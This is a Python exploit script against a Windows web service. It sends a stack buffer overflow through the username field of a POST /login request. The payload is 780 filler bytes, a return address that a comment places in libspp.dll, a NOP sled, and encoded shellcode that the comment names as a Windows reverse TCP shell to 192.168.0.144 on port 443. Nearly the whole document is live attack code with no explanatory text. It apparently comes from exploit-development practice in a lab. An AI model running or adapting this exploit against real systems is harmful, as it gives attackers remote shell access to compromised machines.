#!/usr/bin/python

import socket

#badchars --> \x00\x01\x0a\x0d\x25\x26\x2b\x3d
#end de ret --> 0x10090c83 libspp.dll Windows 10
#windows/shell_reverse_tcp lhost=192.168.0.144 lport=443 exitfunc=thread

shellcode = ("\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\xb4\xa7\x1e\x37\x83\xee\xfc\xe2\xf4\x48\x4f\x9c\x37"
"\xb4\xa7\x7e\xbe\x51\x96\xde\x53\x3f\xf7\x2e\xbc\xe6\xab"
"\x95\x65\xa0\x2c\x6c\x1f\xbb\x10\x54\x11\x85\x58\xb2\x0b"
"\xd5\xdb\x1c\x1b\x94\x66\xd1\x3a\xb5\x60\xfc\xc5\xe6\xf0"
"\x95\x65\xa4\x2c\x54\x0b\x3f\xeb\x0f\x4f\x57\xef\x1f\xe6"
"\xe5\x2c\x47\x17\xb5\x74\x95\x7e\xac\x44\x24\x7e\x3f\x93"
"\x95\x36\x62\x96\xe1\x9b\x75\x68\x13\x36\x73\x9f\xfe\x42"
"\x42\xa4\x63\xcf\x8f\xda\x3a\x42\x50\xff\x95\x6f\x90\xa6"
"\xcd\x51\x3f\xab\x55\xbc\xec\xbb\x1f\xe4\x3f\xa3\x95\x36"
"\x64\x2e\x5a\x13\x90\xfc\x45\x56\xed\xfd\x4f\xc8\x54\xf8"
"\x41\x6d\x3f\xb5\xf5\xba\xe9\xcf\x2d\x05\xb4\xa7\x76\x40"
"\xc7\x95\x41\x63\xdc\xeb\x69\x11\xb3\x58\xcb\x8f\x24\xa6"
"\x1e\x37\x9d\x63\x4a\x67\xdc\x8e\x9e\x5c\xb4\x58\xcb\x67"
"\xe4\xf7\x4e\x77\xe4\xe7\x4e\x5f\x5e\xa8\xc1\xd7\x4b\x72"
"\x89\x5d\xb1\xcf\xde\x9f\xb4\x37\x76\x35\xb4\xa6\xa5\xbe"
"\x52\xcd\x0e\x61\xe3\xcf\x87\x92\xc0\xc6\xe1\xe2\x31\x67"
"\x6a\x3b\x4b\xe9\x16\x42\x58\xcf\xee\x82\x16\xf1\xe1\xe2"
"\xdc\xc4\x73\x53\xb4\x2e\xfd\x60\xe3\xf0\x2f\xc1\xde\xb5"
"\x47\x61\x56\x5a\x78\xf0\xf0\x83\x22\x36\xb5\x2a\x5a\x13"
"\xa4\x61\x1e\x73\xe0\xf7\x48\x61\xe2\xe1\x48\x79\xe2\xf1"
"\x4d\x61\xdc\xde\xd2\x08\x32\x58\xcb\xbe\x54\xe9\x48\x71"
"\x4b\x97\x76\x3f\x33\xba\x7e\xc8\x61\x1c\xfe\x2a\x9e\xad"
"\x76\x91\x21\x1a\x83\xc8\x61\x9b\x18\x4b\xbe\x27\xe5\xd7"
"\xc1\xa2\xa5\x70\xa7\xd5\x71\x5d\xb4\xf4\xe1\xe2")

dados = "A" * 780 + "\x83\x0c\x09\x10" + "\x90" * 16 + shellcode 

tam = len(dados) + 20

request="POST /login HTTP/1.1\r\n"
request+="Host: 192.168.0.80\r\n"
request+="Content-Length: "+str(tam)+"\r\n"
request+="Cache-Control: max-age=0\r\n"
request+="Upgrade-Insecure-Requests: 1\r\n"
request+="Origin: http://192.168.0.80\r\n"
request+="Content-Type: application/x-www-form-urlencoded\r\n"
request+="User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36\r\n"
request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
request+="Referer: http://192.168.0.80/login\r\n"
request+="Accept-Encoding: gzip, deflate, br\r\n"
request+="Accept-Language: en-US,en;q=0.9\r\n"
request+="Connection: close\r\n"
request+="\r\n"
request+="username="+dados+"&password=A"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.80",80))
s.send(request)

